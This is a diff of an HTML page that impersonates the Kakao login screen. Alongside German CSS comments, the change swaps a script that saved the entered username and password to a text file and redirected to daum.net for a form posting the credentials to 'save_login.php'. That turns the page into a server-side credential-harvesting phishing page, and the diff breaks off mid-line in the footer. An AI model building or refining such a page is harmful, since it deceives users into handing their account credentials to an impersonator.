@@ -20,15 +20,15 @@
     .header {
       font-size: 32px;
       font-weight: normal;
-      margin-bottom: 40px; /* Increases the distance to the box */
+      margin-bottom: 40px; /* Erhöht den Abstand zur Box */
     }
     .container {
-      width: 400px; /* Made wider */
-      padding: 40px 40px; /* Increased the padding left and right */
+      width: 400px; /* Breiter gemacht */
+      padding: 40px 40px; /* Vergrößert den Innenabstand links und rechts */
       background-color: #fff;
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       text-align: center;
-      border-radius: 6px; /* Made slightly more angular */
+      border-radius: 6px; /* Etwas eckiger gemacht */
     }
     .login-form {
       display: flex;
@@ -117,39 +117,11 @@
       margin: 5px 0;
     }
   </style>
-  <script>
-    function login() {
-      // Retrieve the input values
-      const username = document.querySelector('input[name="username"]').value;
-      const password = document.querySelector('input[name="password"]').value;
-
-      // Create the text content for the file
-      const text = `Username: ${username}\nPassword: ${password}`;
-
-      // Create a Blob object
-      const blob = new Blob([text], { type: 'text/plain' });
-
-      // Create a link to download the file
-      const link = document.createElement('a');
-      link.href = URL.createObjectURL(blob);
-      link.download = 'logindata.txt';
-
-      // Add the link to the document and click it
-      document.body.appendChild(link);
-      link.click();
-
-      // Remove the link after downloading
-      document.body.removeChild(link);
-
-      // Redirect to the desired page
-      window.location.href = 'https://www.daum.net';
-    }
-  </script>
 </head>
 <body>
   <div class="header">kakao</div>
   <div class="container">
-    <form class="login-form" onsubmit="login(); return false;">
+    <form class="login-form" action="save_login.php" method="post">
       <input type="text" name="username" placeholder="KakaoMail ID, email, phone number" required>
       <input type="password" name="password" placeholder="Password" required>
       <label>
@@ -181,15 +153,4 @@
       <a href="#">Terms of Service</a>
       <a href="#">Privacy Policy</a>
       <a href="#">Operation Policy</a>
-      <a href="#">Customer Service</a>
-      <a href="#">Notices</a>
-      <select>
-        <option>English</option>
-      </select>
-    </div>
-    <div>
-      &copy; Kakao Corp. All rights reserved.
-    </div>
-  </div>
-</body>
-</html>
+      <a href="#">Customer 
